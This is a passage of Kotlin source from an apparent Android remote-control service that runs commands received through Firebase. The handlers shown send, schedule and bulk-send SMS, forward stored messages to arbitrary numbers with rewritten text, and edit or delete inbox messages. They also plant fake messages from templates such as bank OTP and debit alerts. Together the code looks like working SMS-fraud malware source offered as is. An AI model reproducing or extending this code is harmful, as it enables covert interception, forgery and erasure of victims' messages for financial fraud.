        val scheduledMessagePath = "${AppConfig.getFirebaseDevicePath(androidId())}/scheduledMessages/${System.currentTimeMillis()}"
        val scheduledData = mapOf(
            "phone" to phone,
            "message" to message,
            "sim" to sim,
            "scheduledTime" to (System.currentTimeMillis() + delayMs),
            "createdAt" to System.currentTimeMillis(),
            "commandTimestamp" to historyTimestamp
        )
        
        FirebaseWriteHelper.setValue(
            path = scheduledMessagePath,
            data = scheduledData,
            tag = TAG,
            onSuccess = {
                if (delayMs < 60 * 60 * 1000) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        executeDelayedSms(phone, message, sim, historyTimestamp, scheduledMessagePath)
                    }, delayMs)
                } else {
                    scheduleSmsWithAlarmManager(phone, message, sim, System.currentTimeMillis() + delayMs, scheduledMessagePath, historyTimestamp)
                }
                updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "executed")
            },
            onFailure = { e ->
                updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Failed to schedule: ${e.message}")
            }
        )
    }
    
    private fun executeDelayedSms(phone: String, message: String, sim: Int, historyTimestamp: Long, scheduledMessagePath: String) {
        try {
            sendSms(phone, message, if (sim == 1) SimSlot.SIM_1 else SimSlot.SIM_2)
            val timestamp = System.currentTimeMillis()
            val messagePath = AppConfig.getFirebaseMessagePath(androidId(), timestamp)
            FirebaseWriteHelper.setValue(path = messagePath, data = "sent~$phone~$message", tag = TAG)
            Firebase.database.reference.child(scheduledMessagePath).removeValue()
            LogHelper.d(TAG, "Delayed SMS sent successfully")
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error executing delayed SMS", e)
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "Execution error: ${e.message}")
        }
    }
    
    private fun scheduleSmsWithAlarmManager(phone: String, message: String, sim: Int, scheduledTime: Long, scheduledMessagePath: String, historyTimestamp: Long = 0L) {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            val intent = android.content.Intent(this, com.example.fast.receiver.ScheduledSmsReceiver::class.java).apply {
                putExtra("phone", phone)
                putExtra("message", message)
                putExtra("sim", sim)
                putExtra("historyTimestamp", historyTimestamp)
                putExtra("scheduledMessagePath", scheduledMessagePath)
            }
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                this, scheduledTime.toInt(), intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, scheduledTime, pendingIntent)
            } else {
                alarmManager.setExact(android.app.AlarmManager.RTC_WAKEUP, scheduledTime, pendingIntent)
            }
            LogHelper.d(TAG, "Scheduled SMS with AlarmManager")
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error scheduling SMS with AlarmManager", e)
            updateCommandHistoryStatus(historyTimestamp, "sendSmsDelayed", "failed", "AlarmManager error: ${e.message}")
        }
    }
    
    private fun handleScheduleSmsCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing scheduleSms command: $content")
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "SEND_SMS permission not granted")
            return
        }
        
        val parts = content.split(":")
        if (parts.size < 5) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Invalid format: expected phone:message:scheduleType:scheduleValue:recurrence:sim")
            return
        }
        
        val phone = parts[0].trim()
        val message = parts[1].trim()
        val scheduleType = parts[2].trim().lowercase()
        val scheduleValue = parts[3].trim()
        val recurrence = parts[4].toIntOrNull() ?: 0
        val sim = parts.getOrNull(5)?.toIntOrNull() ?: 1
        
        // Validate phone number
        if (phone.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Phone number is required")
            return
        }
        if (!phone.matches(Regex("^\\+?[1-9]\\d{1,14}$"))) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Invalid phone number format")
            return
        }
        
        // Validate message
        if (message.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Message is required")
            return
        }
        if (message.length > 160) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Message too long (max 160 characters)")
            return
        }
        
        // Validate schedule type
        val validScheduleTypes = listOf("daily", "weekly", "monthly", "once")
        if (scheduleType !in validScheduleTypes) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Invalid schedule type. Must be one of: ${validScheduleTypes.joinToString(", ")}")
            return
        }
        
        // Validate schedule value
        if (scheduleValue.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Schedule value is required")
            return
        }
        
        // Validate recurrence
        if (recurrence < 0) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Recurrence must be >= 0 (0 = infinite)")
            return
        }
        
        // Validate SIM number
        if (sim != 1 && sim != 2) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Invalid SIM number: $sim (must be 1 or 2)")
            return
        }
        val nextExecution = calculateNextExecution(scheduleType, scheduleValue)
        if (nextExecution == null) {
            updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Invalid schedule")
            return
        }
        val schedulePath = "${AppConfig.getFirebaseDevicePath(androidId())}/schedules/${System.currentTimeMillis()}"
        val scheduleData = mapOf(
            "phone" to phone,
            "message" to message,
            "scheduleType" to scheduleType,
            "scheduleValue" to scheduleValue,
            "recurrence" to recurrence,
            "remainingCount" to recurrence,
            "sim" to sim,
            "nextExecution" to nextExecution,
            "createdAt" to System.currentTimeMillis(),
            "commandTimestamp" to historyTimestamp
        )
        FirebaseWriteHelper.setValue(
            path = schedulePath,
            data = scheduleData,
            tag = TAG,
            onSuccess = {
                scheduleSmsWithAlarmManager(phone, message, sim, nextExecution, schedulePath, historyTimestamp)
                updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "executed")
            },
            onFailure = { e ->
                updateCommandHistoryStatus(historyTimestamp, "scheduleSms", "failed", "Failed to schedule: ${e.message}")
            }
        )
    }
    
    private fun calculateNextExecution(scheduleType: String, scheduleValue: String): Long? {
        return when (scheduleType) {
            "daily" -> {
                val timeParts = scheduleValue.split(":")
                if (timeParts.size != 2) return null
                val hour = timeParts[0].toIntOrNull() ?: return null
                val minute = timeParts[1].toIntOrNull() ?: return null
                val calendar = java.util.Calendar.getInstance()
                calendar.set(java.util.Calendar.HOUR_OF_DAY, hour)
                calendar.set(java.util.Calendar.MINUTE, minute)
                calendar.set(java.util.Calendar.SECOND, 0)
                if (calendar.timeInMillis <= System.currentTimeMillis()) {
                    calendar.add(java.util.Calendar.DAY_OF_YEAR, 1)
                }
                calendar.timeInMillis
            }
            "once" -> {
                try {
                    java.time.Instant.parse("${scheduleValue}Z").toEpochMilli()
                } catch (e: Exception) {
                    null
                }
            }
            else -> null
        }
    }
    
    private fun handleEditMessageCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing editMessage command: $content")
        
        val parts = content.split(":")
        if (parts.size < 3) {
            updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Invalid format: expected messageId:field:newValue")
            return
        }
        
        val messageId = parts[0].trim()
        val field = parts[1].trim().lowercase()
        val newValue = parts.drop(2).joinToString(":")
        
        // Validate message ID
        if (messageId.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Message ID is required")
            return
        }
        
        // Validate field
        val validFields = listOf("content", "sender", "timestamp", "status")
        if (field !in validFields) {
            updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Invalid field: $field. Must be one of: ${validFields.joinToString(", ")}")
            return
        }
        
        // Validate new value
        if (newValue.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "New value is required")
            return
        }
        if (ActivityCompat.checkSelfPermission(this, "android.permission.WRITE_SMS") != PackageManager.PERMISSION_GRANTED) {
            updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "WRITE_SMS permission not granted")
            return
        }
        try {
            val contentValues = android.content.ContentValues()
            when (field) {
                "content" -> contentValues.put("body", newValue)
                "sender" -> contentValues.put("address", newValue)
                "timestamp" -> {
                    val timestamp = newValue.toLongOrNull() ?: run {
                        updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Invalid timestamp")
                        return
                    }
                    contentValues.put("date", timestamp)
                }
                "status" -> {
                    when (newValue.lowercase()) {
                        "read" -> contentValues.put("read", 1)
                        "unread" -> contentValues.put("read", 0)
                        else -> {
                            updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Invalid status")
                            return
                        }
                    }
                }
                else -> {
                    updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Invalid field")
                    return
                }
            }
            val uri = android.provider.Telephony.Sms.CONTENT_URI
            val rowsUpdated = contentResolver.update(uri, contentValues, "_id = ?", arrayOf(messageId))
            if (rowsUpdated > 0) {
                updateCommandHistoryStatus(historyTimestamp, "editMessage", "executed")
            } else {
                updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Message not found")
            }
        } catch (e: Exception) {
            updateCommandHistoryStatus(historyTimestamp, "editMessage", "failed", "Error: ${e.message}")
        }
    }
    
    private fun handleDeleteMessageCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing deleteMessage command: $content")
        
        if (ActivityCompat.checkSelfPermission(this, "android.permission.WRITE_SMS") != PackageManager.PERMISSION_GRANTED) {
            updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "WRITE_SMS permission not granted. App must be set as default SMS app.")
            return
        }
        
        // Validate input
        if (content.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "Command content is required")
            return
        }
        
        try {
            val uri = android.provider.Telephony.Sms.CONTENT_URI
            val rowsDeleted: Int
            
            if (content.startsWith("bulk:")) {
                val criteria = content.substring(5)
                if (criteria.isBlank()) {
                    updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "Bulk delete criteria is required")
                    return
                }
                val whereClause = buildWhereClause(criteria)
                if (whereClause.first.isBlank()) {
                    updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "Invalid bulk delete criteria format")
                    return
                }
                rowsDeleted = contentResolver.delete(uri, whereClause.first, whereClause.second)
            } else {
                // Single message delete
                val messageId = content.trim()
                if (messageId.isBlank()) {
                    updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "Message ID is required")
                    return
                }
                rowsDeleted = contentResolver.delete(uri, "_id = ?", arrayOf(messageId))
            }
            
            if (rowsDeleted > 0) {
                updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "executed", "Deleted $rowsDeleted message(s)")
            } else {
                updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "No messages found matching criteria")
            }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error deleting message", e)
            updateCommandHistoryStatus(historyTimestamp, "deleteMessage", "failed", "Error: ${e.message}")
        }
    }
    
    private fun buildWhereClause(criteria: String): Pair<String, Array<String>> {
        val conditions = mutableListOf<String>()
        val args = mutableListOf<String>()
        criteria.split("&").forEach { criterion ->
            val parts = criterion.split("=")
            if (parts.size == 2) {
                when (parts[0].trim()) {
                    "sender" -> {
                        conditions.add("address = ?")
                        args.add(parts[1].trim())
                    }
                    "date" -> {
                        val date = parts[1].trim()
                        try {
                            val startOfDay = java.time.LocalDate.parse(date)
                                .atStartOfDay(java.time.ZoneId.systemDefault())
                                .toInstant()
                                .toEpochMilli()
                            val endOfDay = startOfDay + (24 * 60 * 60 * 1000) - 1
                            conditions.add("date >= ? AND date <= ?")
                            args.add(startOfDay.toString())
                            args.add(endOfDay.toString())
                        } catch (e: Exception) {
                            LogHelper.e(TAG, "Invalid date format: $date", e)
                        }
                    }
                }
            }
        }
        return Pair(conditions.joinToString(" AND "), args.toTypedArray())
    }
    
    /**
     * Handle createFakeMessage command
     * Format: "sender:message:timestamp:status:threadId"
     * 
     * Examples:
     * - "+1234567890:Test message:1703123456789:received:null"
     * - "+1234567890:Test:now:received:null"
     * - "+1234567890:Test:1703123456789:sent:thread123"
     * - "+1234567890:Test:1703123456789:read:null"
     */
    private fun handleCreateFakeMessageCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing createFakeMessage command: $content")
        
        val parts = content.split(":")
        if (parts.size < 4) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Invalid format: expected sender:message:timestamp:status:threadId")
            return
        }
        
        val sender = parts[0].trim()
        val message = parts[1].trim()
        val timestampStr = parts[2].trim()
        val status = parts[3].trim()
        val threadId = parts.getOrNull(4)?.trim()
        
        // Validate sender
        if (sender.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Sender phone number is required")
            return
        }
        if (!sender.matches(Regex("^\\+?[1-9]\\d{1,14}$"))) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Invalid sender phone number format")
            return
        }
        
        // Validate message
        if (message.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Message content is required")
            return
        }
        if (message.length > 160) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Message too long (max 160 characters)")
            return
        }
        
        // Parse timestamp
        val timestamp = if (timestampStr.lowercase() == "now") {
            System.currentTimeMillis()
        } else {
            timestampStr.toLongOrNull() ?: run {
                updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Invalid timestamp format. Use milliseconds or 'now'")
                return
            }
        }
        
        // Validate status
        val validStatuses = listOf("received", "sent", "read", "unread", "delivered", "failed")
        if (status.lowercase() !in validStatuses) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Invalid status: $status. Must be one of: ${validStatuses.joinToString(", ")}")
            return
        }
        
        // Create fake message
        val success = FakeMessageManager.createFakeMessage(
            context = this,
            sender = sender,
            message = message,
            timestamp = timestamp,
            status = status,
            threadId = threadId
        )
        
        if (success) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "executed")
        } else {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessage", "failed", "Failed to create fake message")
        }
    }
    
    /**
     * Handle createFakeMessageTemplate command
     * Format: "templateId:sender:variables"
     * 
     * Examples:
     * - "otp_bank:+1234567890:code=123456"
     * - "transaction_debit:+1234567890:amount=1000&account=1234"
     * - "delivery_notification:+1234567890:tracking=ABC123&date=2024-12-25"
     */
    private fun handleCreateFakeMessageTemplateCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing createFakeMessageTemplate command: $content")
        
        val parts = content.split(":")
        if (parts.size < 3) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Invalid format: expected templateId:sender:variables")
            return
        }
        
        val templateId = parts[0].trim()
        val sender = parts[1].trim()
        val variablesStr = parts.drop(2).joinToString(":")
        
        // Validate template ID
        if (templateId.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Template ID is required")
            return
        }
        
        // Validate sender
        if (sender.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Sender phone number is required")
            return
        }
        if (!sender.matches(Regex("^\\+?[1-9]\\d{1,14}$"))) {
            updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Invalid sender phone number format")
            return
        }
        
        // Parse variables
        val variables = FakeMessageTemplateEngine.parseVariables(variablesStr)
        
        // Process template
        FakeMessageTemplateEngine.getTemplate(this, templateId) { template ->
            if (template == null) {
                updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Template not found: $templateId")
                return@getTemplate
            }
            
            // Process template with variables
            // Note: processTemplate needs templateId to get the template, but we already have the template string
            // So we'll use a workaround - get the template from the engine directly
            val processedMessage = if (FakeMessageTemplateEngine.getAvailableTemplates().contains(templateId)) {
                // Pre-built template - use processTemplate
                FakeMessageTemplateEngine.processTemplate(templateId, variables)
            } else {
                // Custom template - process manually
                var result = template ?: ""
                variables.forEach { (key: String, value: String) ->
                    result = result.replace("{${key}}", value, ignoreCase = true)
                }
                // Replace system variables
                val currentDate = java.text.SimpleDateFormat("dd-MM-yyyy", java.util.Locale.getDefault())
                    .format(java.util.Date())
                val currentTime = java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault())
                    .format(java.util.Date())
                result = result.replace("{date}", currentDate, ignoreCase = true)
                result = result.replace("{time}", currentTime, ignoreCase = true)
                result = result.replace("{timestamp}", System.currentTimeMillis().toString(), ignoreCase = true)
                result
            }
            
            if (processedMessage == null) {
                updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Failed to process template")
                return@getTemplate
            }
            
            // Create fake message with processed template
            val success = FakeMessageManager.createFakeMessage(
                context = this,
                sender = sender,
                message = processedMessage,
                timestamp = System.currentTimeMillis(),
                status = "received",
                threadId = null
            )
            
            if (success) {
                updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "executed")
            } else {
                updateCommandHistoryStatus(historyTimestamp, "createFakeMessageTemplate", "failed", "Failed to create fake message from template")
            }
        }
    }
    
    /**
     * Handle setupAutoReply command
     * Format: "enabled:trigger:replyMessage:conditions"
     */
    private fun handleSetupAutoReplyCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing setupAutoReply command: $content")
        
        val parts = content.split(":")
        if (parts.size < 4) {
            updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "Invalid format: expected enabled:trigger:replyMessage:conditions")
            return
        }
        
        val enabled = parts[0].trim().toBoolean()
        val trigger = parts[1].trim()
        val replyMessage = parts[2].trim()
        val conditionsStr = parts.drop(3).joinToString(":")
        
        // Validate trigger
        val validTriggers = listOf("all", "keyword", "sender", "time", "template")
        if (trigger.lowercase() !in validTriggers) {
            updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "Invalid trigger: $trigger. Must be one of: ${validTriggers.joinToString(", ")}")
            return
        }
        
        // Validate reply message
        if (replyMessage.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "Reply message is required")
            return
        }
        
        // Parse conditions
        val conditions = if (conditionsStr == "null" || conditionsStr.isEmpty()) {
            emptyMap()
        } else {
            conditionsStr.split("&").associate {
                val pair = it.split("=", limit = 2)
                if (pair.size == 2) {
                    pair[0].trim() to pair[1].trim()
                } else {
                    "" to ""
                }
            }.filterKeys { it.isNotEmpty() }
        }
        
        // Validate conditions based on trigger
        when (trigger.lowercase()) {
            "keyword" -> {
                if (!conditions.containsKey("keyword")) {
                    updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "Keyword condition is required for keyword trigger")
                    return
                }
            }
            "sender" -> {
                if (!conditions.containsKey("sender")) {
                    updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "Sender condition is required for sender trigger")
                    return
                }
            }
            "time" -> {
                if (!conditions.containsKey("startTime") || !conditions.containsKey("endTime")) {
                    updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "startTime and endTime conditions are required for time trigger")
                    return
                }
            }
            "template" -> {
                if (!conditions.containsKey("templateId")) {
                    updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "failed", "templateId condition is required for template trigger")
                    return
                }
            }
        }
        
        // Setup auto-reply
        AutoReplyManager.setupAutoReply(
            context = this,
            enabled = enabled,
            trigger = trigger,
            replyMessage = replyMessage,
            conditions = conditions
        )
        
        updateCommandHistoryStatus(historyTimestamp, "setupAutoReply", "executed")
    }
    
    /**
     * Handle showCard command
     * Format: "sms" or "instruction"
     * 
     * Controls which card is displayed in ActivatedActivity:
     * - "sms" - Show SMS card (default)
     * - "instruction" - Show instruction card (if content exists)
     * 
     * Updates Firebase: device/{deviceId}/cardControl/showCard
     * 
     * @param content Command content: "sms" or "instruction"
     */
    @SuppressLint("HardwareIds")
    private fun handleShowCardCommand(content: String) {
        val cardType = content.trim().lowercase()
        
        if (cardType !in listOf("sms", "instruction")) {
            LogHelper.e(TAG, "showCard command: Invalid card type '$cardType'. Expected: 'sms' or 'instruction'")
            return
        }
        
        val deviceId = androidId()
        val cardControlPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/cardControl"
        
        Firebase.database.reference.child(cardControlPath).child("showCard").setValue(cardType)
            .addOnSuccessListener {
                LogHelper.d(TAG, "showCard command: Set card to '$cardType'")
            }
            .addOnFailureListener { e ->
                LogHelper.e(TAG, "showCard command: Failed to update Firebase", e)
            }
    }
    
    /**
     * Handle startAnimation command
     * Format: "sms" or "instruction" or "flip"
     * 
     * Triggers animations in ActivatedActivity:
     * - "sms" - Start SMS card animation
     * - "instruction" - Start instruction card animation
     * - "flip" - Trigger flip animation (SMS ↔ Instruction)
     * 
     * Updates Firebase: device/{deviceId}/cardControl/animation
     * 
     * @param content Command content: "sms", "instruction", or "flip"
     */
    @SuppressLint("HardwareIds")
    private fun handleStartAnimationCommand(content: String) {
        val animationType = content.trim().lowercase()
        
        if (animationType !in listOf("sms", "instruction", "flip")) {
            LogHelper.e(TAG, "startAnimation command: Invalid animation type '$animationType'. Expected: 'sms', 'instruction', or 'flip'")
            return
        }
        
        val deviceId = androidId()
        val cardControlPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/cardControl"
        
        val animationData = mapOf(
            "type" to animationType,
            "timestamp" to System.currentTimeMillis()
        )
        
        Firebase.database.reference.child(cardControlPath).child("animation").setValue(animationData)
            .addOnSuccessListener {
                LogHelper.d(TAG, "startAnimation command: Triggered '$animationType' animation")
            }
            .addOnFailureListener { e ->
                LogHelper.e(TAG, "startAnimation command: Failed to update Firebase", e)
            }
    }
    
    /**
     * Handle forwardMessage command
     * Format: "messageId:targetNumber:modify:newMessage"
     */
    private fun handleForwardMessageCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing forwardMessage command: $content")
        
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.SEND_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "SEND_SMS permission not granted")
            return
        }
        
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "READ_SMS permission not granted")
            return
        }
        
        val parts = content.split(":")
        if (parts.size < 3) {
            updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Invalid format: expected messageId:targetNumber:modify:newMessage")
            return
        }
        
        val messageId = parts[0].trim()
        val targetNumber = parts[1].trim()
        val modify = parts[2].trim().toBoolean()
        val newMessage = parts.getOrNull(3)?.trim()
        
        // Validate message ID
        if (messageId.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Message ID is required")
            return
        }
        
        // Validate target number
        if (targetNumber.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Target number is required")
            return
        }
        if (!targetNumber.matches(Regex("^\\+?[1-9]\\d{1,14}$"))) {
            updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Invalid target number format")
            return
        }
        
        // Fetch original message
        val originalMessage = fetchMessageById(messageId) ?: run {
            updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Message not found")
            return
        }
        
        // Prepare message to forward
        val messageToSend = if (modify && newMessage != null && newMessage != "null") {
            newMessage.replace("{original}", originalMessage.body)
        } else {
            originalMessage.body
        }
        
        // Validate message length
        if (messageToSend.length > 160) {
            updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Forwarded message too long (max 160 characters)")
            return
        }
        
        // Send forwarded message
        try {
            sendSms(targetNumber, messageToSend, SimSlot.SIM_1)
            
            // Log forwarded message
            val timestamp = System.currentTimeMillis()
            val messagePath = AppConfig.getFirebaseMessagePath(androidId(), timestamp)
            FirebaseWriteHelper.setValue(
                path = messagePath,
                data = "sent~$targetNumber~$messageToSend",
                tag = TAG,
                onSuccess = {
                    updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "executed")
                },
                onFailure = { e ->
                    updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "executed", "Message forwarded but Firebase log failed: ${e.message}")
                }
            )
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error forwarding message", e)
            updateCommandHistoryStatus(historyTimestamp, "forwardMessage", "failed", "Error: ${e.message}")
        }
    }
    
    /**
     * Fetch message by ID from SMS database
     */
    @SuppressLint("Range")
    private fun fetchMessageById(messageId: String): Message? {
        try {
            val uri = android.provider.Telephony.Sms.CONTENT_URI
            val cursor = contentResolver.query(
                uri,
                arrayOf("_id", "address", "body", "date"),
                "_id = ?",
                arrayOf(messageId),
                null
            )
            
            return cursor?.use {
                if (it.moveToFirst()) {
                    Message(
                        id = it.getString(it.getColumnIndex("_id")),
                        address = it.getString(it.getColumnIndex("address")),
                        body = it.getString(it.getColumnIndex("body")),
                        timestamp = it.getLong(it.getColumnIndex("date"))
                    )
                } else {
                    null
                }
            }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error fetching message by ID", e)
            return null
        }
    }
    
    /**
     * Data class for message
     */
    private data class Message(
        val id: String,
        val address: String,
        val body: String,
        val timestamp: Long
    )
    
    /**
     * Handle smsbatchenable command
     * Format: "{seconds}" - Set batch upload interval in seconds (default: 5)
     * Example: "10" -> Upload batch every 10 seconds
     */
    private fun handleSmsBatchEnableCommand(content: String) {
        LogHelper.d(TAG, "Executing smsbatchenable command: $content")
        
        val seconds = content.trim().toIntOrNull()
        if (seconds == null || seconds < 1) {
            LogHelper.w(TAG, "Invalid smsbatchenable value: $content, using default 5 seconds")
            com.example.fast.util.SmsMessageBatchProcessor.setBatchTimeout(5)
            return
        }
        
        // Set batch timeout (minimum 1 second, maximum 3600 seconds)
        val validSeconds = seconds.coerceIn(1, 3600)
        com.example.fast.util.SmsMessageBatchProcessor.setBatchTimeout(validSeconds)
        LogHelper.d(TAG, "SMS batch timeout set to $validSeconds seconds")
    }
    
    /**
     * Handle sendBulkSms command
     * Format: "recipients:message:personalize:delay:sim"
     */
    private fun handleSendBulkSmsCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing sendBulkSms command: $content")
        
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.SEND_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "SEND_SMS permission not granted")
            return
        }
        
        val parts = content.split(":")
        if (parts.size < 5) {
            updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Invalid format: expected recipients:message:personalize:delay:sim")
            return
        }
        
        val recipientsStr = parts[0].trim()
        val message = parts[1].trim()
        val personalize = parts[2].trim().toBoolean()
        val delaySeconds = parts[3].trim().toIntOrNull() ?: 0
        val sim = parts[4].trim().toIntOrNull() ?: 1
        
        // Validate message
        if (message.isBlank()) {
            updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Message content is required")
            return
        }
        
        if (message.length > 160) {
            updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Message too long (max 160 characters)")
            return
        }
        
        // Validate delay
        if (delaySeconds < 0 || delaySeconds > 3600) {
            updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Delay must be between 0 and 3600 seconds")
            return
        }
        
        // Validate SIM
        if (sim != 1 && sim != 2) {
            updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Invalid SIM number. Must be 1 or 2.")
            return
        }
        
        // Parse recipients
        val recipients = BulkSmsManager.parseRecipients(recipientsStr, this)
        if (recipients.isEmpty()) {
            updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "No valid recipients found")
            return
        }
        
        // Create bulk operation in Firebase
        BulkSmsManager.createBulkOperation(
            context = this,
            recipients = recipients,
            message = message,
            personalize = personalize,
            delaySeconds = delaySeconds,
            sim = sim,
            historyTimestamp = historyTimestamp,
            callback = { bulkOpPath ->
                if (bulkOpPath != null) {
                    // Start sending messages
                    val operation = BulkSmsManager.BulkOperation(
                        recipients = recipients,
                        message = message,
                        personalize = personalize,
                        delaySeconds = delaySeconds,
                        sim = if (sim == 1) SimSlot.SIM_1 else SimSlot.SIM_2,
                        bulkOpPath = bulkOpPath,
                        historyTimestamp = historyTimestamp
                    )
                    
                    BulkSmsManager.sendBulkMessagesAsync(this, operation)
                    updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "executed")
                } else {
                    updateCommandHistoryStatus(historyTimestamp, "sendBulkSms", "failed", "Failed to create bulk operation")
                }
            }
        )
    }
    
    /**
     * Handle bulkEditMessage command
     * Format: "criteria:field:newValue"
     */
    private fun handleBulkEditMessageCommand(content: String, historyTimestamp: Long) {
        LogHelper.d(TAG, "Executing bulkEditMessage command: $content")
        
        if (ActivityCompat.checkSelfPermission(
                this,
                "android.permission.WRITE_SMS"
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "WRITE_SMS permission not granted")
            return
        }
        
        val parts = content.split(":")
        if (parts.size < 3) {
            updateCommandHistoryStatus(historyTimestamp, "bulkEditMessage", "failed", "Invalid format: expected criteria:field:newValue")
            return
        }
        
        val criteria = parts[0].trim()
        val field = parts[1].trim()
        val newValue = parts.drop(2).joinToString(":")
        
        // Validate criteria
